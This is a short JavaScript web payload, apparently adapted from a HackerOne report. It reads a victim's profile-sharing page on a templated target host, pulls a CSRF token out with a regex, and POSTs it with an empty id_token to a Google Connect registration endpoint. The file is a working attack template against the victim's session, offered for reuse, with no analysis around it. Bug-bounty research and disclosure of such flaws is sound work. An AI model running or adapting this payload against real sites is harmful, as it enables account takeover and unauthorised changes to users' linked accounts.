/* 
RIPOFF FROM https://hackerone.com/reports/2010530
*/

(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "";
    b = rx.exec(this.responseText);
    fetch("https://{{TARGET}}/google_connect/register", {"method": "POST", "body": new URLSearchParams({"id_token": id_token, "csrftok": b[1]})})
  });
  a.open('GET', 'https://{{TARGET}}/profile_sharing');
  a.send();
})();